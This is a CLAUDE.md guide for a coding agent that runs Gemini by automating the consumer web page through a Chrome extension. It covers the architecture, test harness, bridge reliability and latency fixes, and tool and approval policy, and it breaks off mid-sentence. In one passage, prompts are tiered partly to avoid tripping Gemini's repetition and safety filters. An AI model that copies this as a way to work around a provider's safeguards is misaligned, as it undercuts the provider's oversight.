# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## What this is

A local coding agent that has **no LLM API client**. Inference happens by driving a real
browser tab: the Node server sends a prompt over WebSocket to a Chrome extension, a content
script types it into gemini.google.com, scrapes the streamed reply,
and sends the text back. Every architectural oddity below follows from that.

npm workspaces: `server/` (brain + CLI UI), `extension/` (MV3 bridge), plus a standalone
`vscode-companion/` (not a workspace).

## Commands

```bash
npm install                       # installs both workspaces from the root
npm run start                     # server with workspace pinned to repo root (../)
npm run dev                       # same, with tsx --watch
cd server && npm start -- --workspace /path/to/project   # run against another project
./setup.sh                        # installs an `agent` / `agent-cli` shim in ~/.local/bin
                                  # (never `npm link` — it needs npm's global prefix)

npm run build --workspace=extension   # esbuild src/background/main.js -> service-worker.js
cd vscode-companion && vsce package --allow-missing-repository --skip-license
```

`extension/service-worker.js` is a **committed build artifact**. Editing anything under
`extension/src/background/` without re-running the build ships stale code — Chrome loads the
bundle, not the sources. `extension/content-scripts/*.js` are loaded directly and are not bundled.
Likewise `vscode-companion/*.vsix` is committed and must be repackaged after editing
`vscode-companion/extension.js`.

### Tests

```bash
npm test                                       # -> server: node --test "test/**/*.test.js"
node --test server/test/core/risk-classifier.test.js   # single file
```

Tests live in `server/test/`, mirroring `server/src/` directory for directory. They used to sit
beside their subjects, which made a missing test visible in an `ls` — that is how `diff-engine.js`
was found with none, and it turned out to be 358 lines that overwrite files, containing a bug
that wrote backups outside the backup directory.

Moving them bought one thing back: `node --test src/` used to be a landmine, because given a
directory Node runs *every* `.js` file under it as a test — including `main.js`, which starts the
WebSocket server and hangs forever. Nothing under `test/` starts anything, so the trap is gone.
The quoted glob is still what makes the script work under `sh`, which has no globstar.

A test that needs a path into the source tree must compute it relative to `src/`, not to itself
(`prompt-loader.test.js` reads `../../src/prompts`).

**Expected state: all tests pass.** They used to be 34/10/24 red: the tests described designs
the code had replaced — `plan-generator` writes one file per comment under `PR-<n>/` rather than
one `PR-<n>.md` per PR, and `comment-classifier` stopped categorising by keyword once the AI
took that over. Both test files were rewritten against the shipped behaviour, so a failure now is
a real regression.

There is no lint script; `.eslintrc.json` (eslint:recommended) and `.prettierrc`
(100 cols, single quotes, trailing commas) exist for editor integration.

### The pty harness — how anything user-visible gets measured

Most of the numbers in this file came from a harness that drives the **real CLI under a pty**
with a fake extension answering prompts from a script, so a full turn — inject, reply, tool
call, tool result, next prompt — runs with no browser and no Gemini account. It lives in the
session scratchpad, not the repo. Rebuild it from this:

- **`drive.py`** — `pty.fork()` the CLI with `--workspace <scratch> --port <p> --editor <shim>
  --no-github`. `PATH` is prefixed with a `bin/` of shims for `open`, `code`, `xdg-open` and
  `cursor` that log their argv instead of launching anything, which is how "did it open the
  editor" became checkable. Steps are a JSON list: type text, send a key, resize the window
  (`{"resize": [rows, cols]}`), or write a file into `.agent/state/` to stand in for the VS
  Code companion. It counts bytes, `ESC[2J`, `ESC[3J` and erase-lines per step — which is what
  makes a frame regression visible at all.
- **`fake-extension.js`** — connects with a `chrome-extension://` origin, sends
  `{type:'identify', payload:{clientType:'extension'}}` (`clientType`, not `client`), and
  answers each `inject_prompt` from a scripted list. It logs every prompt it is given, which
  is where the per-turn character counts come from.
- **`ext-cadence.js`** — the real extension in headless Chrome against a server whose
  `verifyClient` **refuses every handshake**, so each retry becomes an observable timestamp.
- **`scrape-test.mjs`** — the scrape lifted verbatim out of the bridge and run against a
  Gemini-shaped DOM in jsdom.

**Check the harness before believing anything, positive or negative.** It has lied at least
six times, and most of those looked like product bugs first: a port the extension never dials;
a file-seeding step that also typed its content into the prompt; an extractor that dropped an
`async` keyword; a fake extension that answered subagent requests without `isSubagent`, so
compaction hung; a `ClipboardEvent` probe that silently did nothing, making an empty composer
look like proof the send button was unfindable; and a `ws` import that was wrong, so a "resize
during a live turn" measurement had no live turn in it.

**A passing test lies the same way.** `toolCatalogDrift()` compared an empty registry to an
empty catalog and went green — it needed a negative control per branch before the pass meant
anything.

**And a tool with no test at all is worse.** `find_symbol` had 1,474 green tests around it and
not one that called it, so a stray edit that left `isMethod` referenced in `findSymbol` — where
it is never defined — made **every** `find_symbol` call return `Tool find_symbol failed:
isMethod is not defined`, and shipped. Its sibling `find_references` was covered in detail;
the tool beside it was covered not at all.

The cause is a class, not an accident: **a Python `str.replace(old, new)` with no count
replaces every occurrence**, and the tail of `findSymbol` was byte-identical to the tail of
`findReferences`. This file already said "a string anchor hits the first match"; replacing
without a count is the same trap with the opposite failure. When editing by script, assert the
match count before writing.

`test/mcp/tool-smoke.test.js` is the answer that generalises: every registered tool called once
on its happy path, plus a membership assertion so a tool added later cannot slip past by simply
not being in the map. It asserts almost nothing about *what* comes back — the per-tool suites
do that — only that the call the agent makes does not throw. A tool that cannot run at all is
the failure that costs a whole turn, and the model has been told by the prompt that it exists.

## Layout

```
server/src/
├── index.js          # bin shim: re-spawns main.js under tsx (sources contain JSX)
├── main.js           # arg parsing, migration, component wiring, bootstrap
├── core/             # agent-loop, prompt-builder, diff-engine, risk-classifier,
│                     # task-manager, paths, migrate, workspaces
├── bridge/           # websocket-server (the Chrome-extension transport)
├── context/          # token budget: code-minifier, symbol-index,
│                     # context-manager, memory-manager
├── github/           # PR agent: poller, comment-classifier, ci-log-parser, plan-generator
├── mcp/              # mcp-server.js + tools/
├── storage/  watcher/
└── ui/               # the terminal front-end
    ├── cli-ui.jsx    # render(): stdin shim, hotkey routing, trailing-Enter split
    ├── App.jsx       # state, effects, layout — everything else is a module
    ├── hotkeys.js    # ctrl+ chords, pulled off stdin before Ink sees them
    ├── enter-splitter.js  # peels a trailing \r off a chunk so Enter is a keypress
    ├── paste.js      # collapses a big paste to a marker; expands it on submit
    ├── format.js  constants.js  transcript.js     # pure, tested
    ├── hooks/        # use-key-bindings, use-hotkeys, use-github-tab,
    │                 #   use-github-keys, use-slash-commands, use-agent-callbacks
    └── components/   # Banner, TranscriptTurn, GithubTab, Menus, InputBar,
                      #   AgentTerminal, QuestionPrompt
```

Modules are kebab-case; React components keep PascalCase (`ui/App.jsx`). Tests live in
`server/test/`, mirroring this tree — `src/core/paths.js` is tested by `test/core/paths.test.js`.

## Architecture

### Turn lifecycle

`main.js` wires everything and hands off to `ui/cli-ui.jsx` → `ui/App.jsx`.

1. `App.jsx` sends user input to `AgentLoop.handleUserMessage` (`core/agent-loop.js`).
2. `PromptBuilder.buildPrompt` (`core/prompt-builder.js`) assembles the prompt.
3. `AgentLoop._sendToGemini` pushes onto `extensionQueue` and calls `callbacks.injectPrompt`;
   `bridge/websocket-server.js` relays it to the extension. The queue is serialized by
   `isExtensionBusy` — one browser tab, one in-flight prompt.
4. The content script streams back `gemini_response_stream` (rendered live) then
   `gemini_response`, which resolves `AgentLoop.handleGeminiResponse`.
5. `_extractToolCalls` parses JSON tool calls out of the reply text (there is no structured
   tool-call API — this is text parsing, hence `_cleanJsonString`), then `_executeToolCalls`
   dispatches through `MCPServer.executeTool`.
6. Results are fed back via `buildToolResultPrompt` and the loop repeats.

### Bridge liveness — why a prompt used to wait for you to open Chrome

Reported from use, 2026-09-17: *"most of the time the prompt is not sent while I am out
of Chrome, and as soon as I open Chrome or the Gemini tab it is sent."* That is two
independent faults that produce one symptom, and neither is throttling.

**The reconnect alarm was cleared on connect.** `chrome.alarms.create('reconnect')` was
called in `scheduleRetry` and `chrome.alarms.clear` in `stopKeepAlive` — which runs on
`onopen`. So a *healthy* bridge had no alarm at all. Chrome can still evict a service
worker that believes it is connected, and when it does the socket dies with it: `onclose`
never runs inside a worker that is already gone, no `setTimeout` survives it, and nothing
outside the browser can reach in and start it. What actually revived it was incidental —
the user focusing a tab, `chrome.tabs.onUpdated` firing, and Chrome starting the worker to
deliver that event, which re-runs the module and its bottom-line `connectWebSocket()`.
The alarm is periodic and permanent now. While connected it costs nothing, because the
heartbeat already keeps the worker resident; it is the only thing that can resurrect a
worker Chrome has silently collected. `test/background/watchdog-alarm.test.js` pins it,
including a source assertion that `stopKeepAlive` does not clear it — re-adding that line
reads as ordinary cleanup in a diff.

**And the prompt it was waiting for had already been thrown away.** `broadcast` returns
whether it reached anyone; every caller ignored it. `injectPrompt` with no extension
connected wrote to no sockets and vanished, leaving the lane busy until the seven-minute
watchdog. `sendInjectPrompt` honours the return and holds what it could not deliver;
`flushPendingInjects` drains it when a client **identifies as an extension** — not on
socket open, because the socket is open before we know what is on the other end and the
side panel uses the same transport. Held prompts past `INJECT_BUFFER_TTL_MS` are dropped
rather than sent: the lane watchdog has already abandoned that turn, and typing it into
Gemini then starts a conversation nobody is listening to.

**Fixed sleeps became a readiness handshake.** 4000ms after opening a subagent tab, 1500ms
after a new main tab loaded, 1000ms after re-injecting — 6.5s of unconditional waiting per
new tab, wrong in both directions: seconds burnt on a warm machine, and still too early on
a cold one, where the send lands before the listener exists and is reported as an
unreachable tab. `waitForBridge` polls a `ping` the content script answers. It reports two
things because they fail differently: `ready` (this script is listening and not orphaned)
and `canType` (the composer is in the DOM, which is the real precondition for an inject).
**Gating only on `canType` would be worse than the sleep it replaces** — a changed composer
selector would turn "the send fails with a readable error" into "every turn burns its whole
budget first" — so the last 40% of the budget accepts `ready` alone and lets the send
produce the honest error.

**The 3-second nudge was the third mechanism doing this job, and the most expensive.** Every
model tab ran `setInterval(() => safeSend({type:'connect'}), 3000)` for the life of the
page, so an open Gemini tab woke the service worker twenty times a minute forever — a
worker never allowed to go idle, to solve a problem that only exists while there is nothing
to connect to. The worker now answers `connect` with its state and the tab backs off to 30s
once connected, which is a tenth of the steady-state cost with the fast cadence still there
for the case it was written for. It reports the state *before* attempting the connection:
`connectWebSocket` resolves long before a socket is open, and answering "connected" there
would slow the nudge down at the moment it is working.

**The clock was the only throttled thing, and that is measurable.**

The bridge activated the model tab and held your focus for the length of a turn, because
completion was detected by a 2s `setInterval` in the content script and Chrome throttles
page timers in a hidden tab. Before redesigning around that, it was measured — on
example.com, in a genuinely hidden tab, Chrome 152, over 334 seconds:

| mechanism | delivered | expected |
| --- | --- | --- |
| page `setInterval(100ms)` | 63 | 3340 — **1.9%** |
| **Worker** `setInterval(100ms)` | 3344 | 3340 — 100% |
| **`MutationObserver`** | 9.97–10/s every bucket | 10/s |
| **`getBoundingClientRect()`** | 3213 real boxes | **0** empty |

Three things that were assumed to be broken in a hidden tab are not. The MutationObserver
that supplies the evidence runs at full rate. Layout works, so the Stop-button visibility
check — `getBoundingClientRect` plus `getComputedStyle` — is sound. A Worker's timers are
not throttled at all. **Only the page's own timer is**, and it collapses to roughly one
tick per minute within 60 seconds of the tab being hidden, staying there across the
five-minute intensive-throttling boundary rather than degrading further at it.

So a 2s completion check becomes a ~60s one, per round, and a multi-round turn stalls until
you look at the browser. That is the whole of "it hangs while I am out of Chrome".

The fix keeps the evidence in the page and moves the clock out: a service worker is not a
tab and is not throttled, and `chrome.tabs.sendMessage` is an *event* rather than a timer,
so it is delivered at full rate into a hidden page. `startCompletionTicks` drives
`tick_completion` every 2s from the worker; the content script's own interval stays as a
backstop for a worker evicted mid-turn. **A Worker inside the page would also have worked
and was rejected**: creating one from a content script means either a `blob:` URL, which
gemini.google.com's CSP is entitled to refuse, or a `chrome-extension://` URL, which is
cross-origin for a worker. The service worker needs no new capability and is already kept
alive for the turn by the heartbeat.

With the clock outside the tab, **focus is returned as soon as the send lands** rather than
when the reply does — the tab only has to be in front long enough to accept the paste.

**Chrome also discards background tabs**, which looks identical to a hang: the tab stays in
the strip with its title intact while the page and content script are gone.
`prepareTabForTurn` sets `autoDiscardable: false` on a tab about to hold a turn, and
reloads plus re-handshakes one that was already discarded. The flag is a request, not a
guarantee, which is why the repair exists alongside it.

**What is still unexamined:** the `MutationObserver` watches `document.body` with
`subtree: true, characterData: true`, which on an app as busy as Gemini fires far more than
it needs to. Narrowing it to the response container is a real cost saving and a real risk —
a wrong selector observes nothing and every turn breaks — so it wants measuring against the
live page, not a guess.

**Self-healing: what is repaired, and the two things deliberately not.**

Every failure below used to end the turn, and the prompt with it.

- **A failing send repairs the tab.** `sendWithRepairs` is a ladder — send,
  re-inject the content script, reload the tab — cheapest repair first, because
  the commonest cause by far is a script orphaned by an extension reload. It
  **stops before opening a fresh tab, on purpose**: a reload returns to the same
  `/app/<id>` and Gemini still holds the thread, while a new tab is a new
  conversation, and an incremental prompt sent into one gets a confident answer
  to a question the model never saw. Losing a turn beats answering a different
  one. That is the same reasoning `session_lost` already encodes for batch tabs.

  **That middle rung did nothing at all until 2026-09-19.** The bridge declared
  its constants at the top level of the content-script world, and that world
  outlives the script that created it — so re-injecting into a tab that already
  had a copy threw `Identifier 'RESPONSE_IDLE_TIMEOUT' has already been
  declared` on line one and the fresh copy never evaluated. The rung existed for
  exactly the case that guarantees a copy is already there. It failed silently,
  `waitForBridge` then burned its budget waiting for a script that had not
  loaded, and the only evidence was an entry on `chrome://extensions`.

  The file is an IIFE now, which makes a second injection legal, and a
  `window.__agentBridgeStop` handover makes it a *replacement*: the new copy
  calls the old one's `invalidate()` before taking the handle, so the orphan's
  MutationObservers and timers stop immediately instead of running until
  something happens to call `safeSend`. Skipping would not have done — the goal
  is to replace an orphan, not to notice one.
- **A prompt that never reached the composer is sent again, once.** The content
  script always knew the difference and discarded it. `sawGenerating` is the
  discriminator: generation started and we failed to read it means the model
  **has** an answer, so a resend asks twice into a thread that already holds the
  first reply; generation never started and nothing scraped means the submit did
  not happen, so a resend is the first attempt landing. Only the second retries.
  It resends `_lastMainPrompt` **verbatim**, because `buildPrompt` has side
  effects — rebuilding after a failed turn 0 marks the system prompt as seen and
  hands the model a bare question with no tools.
- **A tab about to hold a turn is opted out of discarding, and reloaded if it
  was already discarded** (`prepareTabForTurn`). A discarded tab is
  indistinguishable from a hang: it keeps its title in the strip while the page
  and script are gone.

Not done, and why: **`timedOut` with partial text is not retried** — the model
answered, and a second ask corrupts the thread for a reply we already partly
have. And **a disconnected extension mid-turn does not re-dispatch the in-flight
prompt**; `pendingInjects` covers prompts that were never delivered, but one
that *was* delivered may have been answered into a tab we can no longer see, and
re-sending it blind is the double-answer bug again. Doing that safely needs the
worker to ask the tab whether it is still watching that `requestId` — the
`tick_completion` handshake is the piece that would make it answerable.

**Tool amnesia: the cause is a thread the model never saw, not a bad detector.**

Reported from use with two screenshots. The prompt in both was the *short*
turn — a bracketed context line and a list of tool **names** — sent into a
brand-new Gemini conversation. The model has names and no definitions, so it
says the tools "are not actually connected to my current execution
environment", and the turn is spent.

`hasSeenSystemPrompt` is the **prompt builder's belief**; the model's memory is
the **thread**, which is the entire premise of `chat-thread.js`. Nothing
connected the two. So when the tab moved to a different conversation — the user
opening a new chat, `ensureModelTab` opening one because the old tab was gone,
a reload landing on `/app` with no id — the builder carried on sending short
turns forever. `_recordThread` notices the change already; it now also calls
`resetPromptState()`, but **only when there was a previous thread**: the first
id of a session is turn 0's own conversation, which already carried the prompt.

**The detector was wrong in both directions, and one of them destroyed
answers.** `looksLikeCapabilityDenial` gates a repair that discards the reply
and re-asks. It asked for an inability phrase and then, loosely, for any of
`execute|run|access|read|…` within 60 characters of any of
`local|file|directory|command|…` — a window wide enough to span two clauses, so
*"I read the file and I can't see any problem with the parser — the local
variable is fine"* was classified as a refusal and thrown away. Meanwhile both
denials seen in use that day slipped through, because both were **passive**:
the model did not say it could not, it said the tools were not connected.

The cure for the false positives is the *subject*, not a narrower window. A
denial is about the agent's tooling or the box it runs in; an ordinary answer
saying "can't" is about code. `local scope` and `local variable` are no longer
objects, `local disk` and `file system` are, and `mcp/tools/` is excluded by
path because in this repo that directory is a thing an answer mentions by name.
A second pattern covers *"I can't read files in that directory"*, which names
no environment: there the negation must attach within four words to a verb the
tools perform, so `can't see`, `can't reproduce`, `can't find` and `can't make`
— the four ways an ordinary answer says it — do not qualify.
`test/core/denial-corpus.test.js` holds both lists; the old pattern fails it in
both directions.

**And moving the clock exposed a latent race.** A turn ended on a *single*
observation of "no Stop button and one second since the text changed". That was
only safe while the check was throttled to roughly once a minute, where a
transient is almost never sampled. At a reliable 2s cadence the transients get
caught, and a reply came back truncated mid-token. Gemini pauses longer than a
second between sections and the Stop button is briefly absent while the
composer re-renders — either alone looks exactly like finished. The condition
must now hold across consecutive checks. **A fix that makes something reliable
will find every place that was quietly relying on it being unreliable.**

**Turn latency, measured — and where it actually goes.**

`core/trace-log.js` records five stages per turn (`find_input`, `type`, `send`,
`first_token`, `complete`); `/trace` reads them back. From 74 real turns on the
owner's machine:

| stage | median | p90 |
| --- | --- | --- |
| `find_input` | 1ms | 13ms |
| `type` | 24ms | 513ms |
| `send` | 514ms | 1201ms |
| `first_token` | **0ms** | 1ms |
| `complete` | 6004ms | 18981ms |

Two things fall out of that table, and neither is Gemini being slow.

**`first_token` measured nothing.** It was marked one line after the send, so
it timed the gap between two adjacent statements. The number it is named for —
the one that separates *the model thinking* from *our overhead* — was never
captured; it all went into `complete`. Marked now when the observer first sees
text, which is what makes any further latency claim checkable.

**`complete` was quantised to the poll interval.** 6004, 8966, 10001, 16002,
30064: every sample sits on a ~2000ms boundary, because a finished reply is
only noticed when the check next fires. A reply that ended at 4.2s was
delivered at 6s, and the two-consecutive-checks rule that stopped truncated
replies added another whole interval. The rule is right and the *cadence* was
wrong: the tab now reports `confirmSoon` as soon as it goes quiet and the
worker returns at a quarter of the interval for the confirming look — slow
while the model writes, fast only when there is something to confirm.

The remaining per-turn overhead is `send` (~0.5s median, 1.2s p90), and the
real multiplier is **round trips**: every tool call is another full
inject → think → scrape cycle, so tail latency is paid once per round, not
once per turn.

**And the confirming look leaked, once per turn, compounding.** It was scheduled with a bare
`setTimeout` nobody held, and `stopCompletionTicks` cleared only the interval. Stopping a turn
from outside — the tab closing, the session ending, the next turn starting — therefore left a
tick to fire into a tab whose turn was over, which costs one stray message and nothing else.

The next turn is where it gets expensive. `startCompletionTicks` stops the old ticker and
installs a new one, so an orphaned confirm firing afterwards finds `completionTickers.has(tabId)`
**true again** — for the new turn — and schedules another. That is a second fast chain running
beside the real one, holding the *previous* turn's `everyMs`, with no handle anywhere to stop
it, and it compounds once per turn on a long session.

`completionConfirms` holds the pending timeout so the stop can cancel it, and the cancel runs
*before* the early return on a missing interval — returning early there is precisely how it got
left running.

**It was found by widening an unrelated timing window until the leak reached the next test.**
Nothing else would have: a stray message is invisible and the doubling only shows if you count.
That test had asserted `>= 3` ticks after `TICK * 1.6`, where the third tick and the deadline
are 4ms apart — so it failed about one run in five, on the machine's load rather than the code.
**A wall-clock assertion with no margin measures the machine**, which the frame-budget harness
had already learned once.

**`mergeLoopHistory` uses a recorded position, not a count.** It counted the screen's
non-local rows and used that number to `slice()` the loop's history — valid only if the screen
mirrors the loop one-for-one, in order. Two ordinary things break that: `file-watcher.js`
appends `[System Event]` turns the screen never asked for, *including before the session's
first prompt*, and the prompt is echoed to the screen optimistically, so it is there before the
loop has it. Measured under the harness with a busy watcher: screen 1 row, loop 16 —
`[system ×12, user, agent, system, system]`. Slicing from index 1 appended eleven system events
and a second copy of the user's own prompt, and every later merge was misaligned. The position
now rides on the rows (`__loopIndex`), and the optimistic echo (`__echo`) is claimed by the
loop's own copy rather than drawn twice — once per echo, because asking the same question twice
must produce two rows.

**The reply after a diff approval — fixed by reprinting, not by staying live.** `App.jsx` keeps only the last turn live *while `isProcessing`*; everything else is
committed to `<Static>`, which Ink never repaints. `agent_response` cleared `isProcessing` even
when the turn still had tool calls to run, so the turn was written to scrollback mid-flight and
the tool result, the approval and the closing reply were appended to a group that could no
longer be drawn. Reproduced in the harness: file written, diff shown, final reply never drawn.

The obvious fix — make `isProcessing` follow `agentLoop.isProcessing`, so the turn stays live
until the loop is done — restores the reply and is **catastrophic**: one run went from 15KB and
**0** full clears to **6.8MB and 1,228**, which is the flicker bug entire. Three attempts to
bound the longer-lived turn made it worse still (45, then 89 clears). Do not retry it.

What works is the mechanism this file already had for exactly this: the turn still commits
early, and when a *committed* turn grows, `<Static>` is remounted and the transcript reprinted.
Measured across three runs: **18.2–18.5KB, 0 clears, reply present** — against a 15.1KB, 0-clear
baseline where the reply never appeared. A remount reprints without clearing, so it is cheaper
than the one clear `ctrl+e` pays.

Two traps, both of which produced confident wrong numbers first:

- **The harness was measuring nothing repeatable.** `drive2.py` waited a fixed number of
  seconds between steps, so pressing enter to approve could land *before* the prompt existed —
  a different code path. Identical code measured 1 clear and 89. `drive3.py` waits on observed
  output (`{"wait": "Approve"}`) and is reproducible to within 300 bytes across runs. **Any
  frame-budget number taken with a wall-clock driver is noise.**
- **The first cut of the reprint counted `t.messages`, which `groupTurns` does not return** (it
  is `steps`). The shape never changed, the epoch never bumped, and it measured a clean 0
  clears *while doing nothing at all* — a fix that looks perfect because it is inert. Only the
  reply still being missing caught it.

### Prompt economics

`PromptBuilder` sends the **full system prompt + tool definitions only on turn 0 and every
Nth turn** (`resetPromptState` after `/compact` or `/clear`). This is not an optimization —
resending a large system prompt every turn trips Gemini's repetition/safety
filters and A/B-test modals. Prompt content is also tiered by `modelTier`
(`lite` / `flash` / `pro` — renamed 2026-09-20 to the picker's own words) via
`_getReasoningInstructions`.

The **tool anchor** (`_buildToolAnchor`) is the exception that rides on *every* turn: tool
names only, 56 tokens against 1,575 for the definitions. The model does not gradually forget
its tools, it forgets them completely — mid-session it answers "I cannot execute local
commands or access your local file system" with total confidence and the turn is lost. Three
detectors in `core/drift-detector.js` back that up, each with a different response:
`looksLikeMultipleDrafts` → bring the refresh forward; `looksLikeCapabilityDenial` → resend the
full definitions and retry the turn once (`requestToolRedeclaration`, **not**
`resetPromptState` — see below); `looksLikeProviderError` → Gemini's own error rather
than an answer, so re-ask (this one used to be written to disk as a PR plan). All three match
prose and will always trail the model's phrasing, which is why the anchor exists: prevention
first, detection as the backstop.

**The repair for tool amnesia used to be the heaviest prompt in the system.** It called
`resetPromptState()`, which does not mean "send the tools again" — it means "pretend this
chat has never seen a prompt", so the next turn was a full turn-0 payload: system
instructions, tool definitions, `AGENT.md`, memory and the skill catalogue. The model had
not forgotten the project; it had forgotten one block. And the reason prompts are tiered at
all is that a large repeated payload trips Gemini's repetition and A/B-test filters — so
the old repair fired the largest prompt available at exactly the moment the session was
already unhealthy, which makes it a plausible *cause* of the next failure. Measured on this
repo: **25,445 characters against 9,991, a 61% cut.** `requestToolRedeclaration()` sends the
condensed reminder plus the full definitions and nothing else. It outranks the periodic
refresh, because that tier sends tool *names* and names are what just failed.

**Saying what would prove you wrong (`pro-hypothesis.md`).** Proposed as a "hypothesis
engine": a falsifiable hypothesis before every search, with `<invalidation_criteria>` and a
1–100 `<confidence_score>`. Measuring the prompts first narrowed it a long way. `standard`
already asks for *"what you expect the next call to show"*, which is most of a hypothesis —
what no rung asked was **what would disprove it**, or what to do when the answer is not clear.
Those two are the whole gap, and they cost **714 characters** rather than a taxonomy rewrite.

Scoped to `standard` and `deep`, because it costs **output** tokens and output is generation
time: `brief` promises "straight to work", and the flash rungs are written for a model that
follows short prompts and ignores long ones. Verified the way the last prompt move was —
**6 of the 10 effort × topology shapes come out byte-identical**, and the four that change do
so by exactly +714. The first attempt was +1 character on `brief` too, from a newline left
outside the conditional.

**The numeric confidence score was declined.** A model asked for a number produces one, and a
fabricated `87` reads as evidence. The instruction is behavioural instead — if you would not
bet on it, ask — which is the part that changes what the agent *does*.

**And the rungs were not as thin as they looked — then they were revisited and there is one.**
An earlier note here claimed the three pro rungs "differ only by `isBrief`". Measured:
21,907 / 25,436 / 26,343 characters, differing by plan-first, a phase-2 analysis, adversarial
self-review and an assumption ledger. What was genuinely thin was `standard` → `deep` at
**+3.6%**, and that is the one that was acted on: **since 2026-09-20 there is a single pro
rung.** `pro` is the old `standard` plus `deep`'s review step; the critical-analysis phase and
the assumption ledger are declined because they are paid in **output** tokens on every pro
turn, which a prompt character count does not show.

**On `deep`, the hostile reviewer is a different model.** `deep` ended with "read the diff as
a hostile reviewer", and a model reviewing its own diff is the weakest reviewer available: it
shares every assumption that produced the code. With a reviewer configured it now calls
`ask_reviewer` instead.

Scoped to `deep` **and** `topology === 'duo'`. On solo the step stays self-review, because
naming `ask_reviewer` in a prompt that does not define it instructs a call to a tool the model
has never been given — the drift `toolCatalogDrift` exists to catch. Verified: 9 of the 10
effort × topology shapes byte-identical, `deep/duo` +111 characters.

**Why this shape and not a multi-agent pipeline.** The current reading of the literature is
that extra agents earn their place when they contribute *intelligence rather than actions* and
writes stay single-threaded — [Cognition's "Don't Build Multi-Agents"](https://cognition.com/blog/dont-build-multi-agents)
reports coordination breakdowns as ~37% of multi-agent production failures, and its core
objection is that summaries lose the implicit decisions behind them. One reviewer with no write
access is that shape; a planner → tech-planner → reviewer chain handing each other summaries is
precisely the failure mode.

It is also the only fan-out that is *real* here. `extension-lock` gives each **tab** a lane —
`main:<model>` for the conversation you are looking at, `sub:<requestId>` for a subagent turn in
a tab opened for it and closed after — so `ask_*` calls genuinely run at once, same model or
not. That was not always true: the extension addressed tabs by URL pattern, so two same-model
requests raced for one tab and could interleave two prompts into one conversation. Tab identity
is what removed that, and it is why a same-model reviewer is now offered at all. Claude Code's
subagents buy *context isolation* rather than speed, and Cursor
3's eight parallel agents are bought with **git worktree isolation** — a separate filesystem per
agent, which this project does not have and would need before parallel *writers* were safe.

**Subagents are not faster here, and the reason is measured.** Each subagent turn opens a tab
that is closed when the turn ends, so turn 2 has never seen turn 1 — **81% of characters
resent** over ten turns. Holding one tab across a subagent's turns is the largest single waste
left in the system, and it is a bridge change rather than a prompt one.

### Tools

`mcp/mcp-server.js` holds a flat `TOOL_DEFINITIONS` array (name, description, parameters,
handler) with handlers in `mcp/tools/`. To add a tool: write the handler, add one entry to that
array, **and one to `core/tool-catalog.js`** — that is what the prompt is rendered from, and
`toolCatalogDrift()` fails the build if the two disagree. The description *is* the contract.

**`find_references` answered 0 for every method in the repo, and said "It may be dead code".**
A method is only ever called as `x.name()`, and `referencesIn` excluded member properties —
correctly, for a *binding*: `fs.readFile` does not use a `readFile` variable. Nothing
distinguished that question from "who calls this method?", so the second one always answered
nothing. Measured through the real tool before the fix: `buildToolResultBatch` **0** against 17
real call sites, `acceptDiff` **0** against 17, `classify` 4 (the standalone function only)
against 14. This is the `semantic_search` failure exactly — the model reaches for the tool, is
told the code is not there, and acts on it — except that here the action it invites is deletion.

`includeMembers` is the second question, and the caller has to say which one it is asking.
Hits found that way are tagged `viaMember`, because `x.name` genuinely cannot be told from a
same-named method on another object; an answer that hides its own ambiguity is the one that
gets acted on wrongly. **It is gated on the name being defined as a method in this repo**, not
on always: measured unconditionally, `find_references("map")` is 165 rows of `Array.prototype`
and `join` 180 — a wall of text about the standard library, every character of which is retyped
into a browser next turn. Neither is defined here, so the gate excludes both.

**And the definition was missing from the answer that promises to list it.** The prompt says
"list the definition too (default true)" and "the definition is marked". For a function, whose
`id` is a real Identifier, that was true; for a method, whose non-computed `MethodDefinition`
key is deliberately never visited, it never was. Added in the handler rather than in
`referencesIn`, so that function goes on answering only the question it is good at.

`find_symbol` / `find_references` (`context/symbol-index.js`) are the structural half of code
search, on acorn + acorn-jsx + acorn-walk. Two traps, either of which reproduces the failure
that got `ast-chunker` deleted: `acorn-jsx` teaches the *parser* and not the walker, so a `.jsx`
file parses and then throws `No walker function defined for node type JSXElement`; and
`acorn-walk` defines `ImportSpecifier` as `ignore`, so `import { X }` is never visited and "who
imports this?" answers nothing. Built lazily and cached by mtime — 135 ms cold, 3 ms warm on
this repo, 282 of 282 exported symbols. `executeTool` retries transient OS errors (EBUSY/EACCES/EAGAIN/EMFILE/EPERM) with
backoff and rewrites `errno` codes into LLM-readable instructions.

### Workspace

`core/workspaces.js` owns path handling for the workspace: `resolveWorkspaceInput` (`~`
expansion, relative paths, quotes), `validateWorkspace` (exists / is a directory / readable) and
`listWorkspaceCandidates` for the `/set-workspace` picker. `AgentLoop.setWorkspace` is the one
place that rewires the collaborators that hold a copy of the path — `/workspace` and
`/agent-dir` each used to carry their own list and had already drifted. SessionStore is
deliberately *not* rebound: doing so would write the current conversation into another
project's history.

### Approval path

Writes never go straight to disk. `edit_file` / `create_file` produce a `DiffEngine`
(`core/diff-engine.js`) diff with per-hunk accept/reject, backups, atomic writes, and `undo()`.
Commands pass through `core/risk-classifier.js`, which decides whether `App.jsx` must prompt;
persistent allow/block rules live in `commandRules`  (`/allowlist`).

**Who may run what is `core/tool-policy.js`, not `_executeToolCalls`.** Two pure functions —
`isBlockedOutright` and `requiresApproval` — over the catalog's own `mutates`, `shell` and
`detached` flags. It was decided inline, 487 lines deep in dispatch, and that is precisely how
`run_background` came to skip every gate: the plan-mode branch named the mutating tools
literally, a fourth was added later and not added there, so the mode whose status bar reads
"plan — every edit needs approval" spawned a detached shell process without asking, while auto
mode asked about the same call through the classifier's "Unknown tool" default. **The careful
mode was the permissive one.** The fix is not "add it to the list" — there is no list any more,
so the next tool that writes is gated by declaring itself beside its description.

**And the extraction immediately found a second one of the same shape.** The read-only
exemption — `ls` must not need a keystroke, or the prompt becomes something people dismiss
without reading — was written as *any shell tool the classifier calls safe*, and
`run_background` is a shell tool. So `run_background npm run dev` was exempt on the strength of
a verdict about the **command text**, while the process it spawns is still running after the
turn, the mode, and possibly the session have ended. The classifier reads a string; it cannot
see that. `DETACHED_TOOLS` is the flag that lets the exemption ask. It was invisible while the
policy was a branch inside dispatch and took one test to surface once it was a function.

**The rest of the dispatch loop came apart the same way.** `_executeToolCalls` was 487
lines; it is 240 now, and the two pieces that left are the two that were doing something other
than dispatching.

`core/loop-tools.js` holds the three the loop answers itself — `ask_question`,
`ask_subagent`, `manage_memory`. The catalog has said `dispatch: 'loop'` about them since it
was written, and the chain named them literally with an `else` sending everything else to
`mcpServer.executeTool`: a fourth loop tool would have gone to a server with no handler and
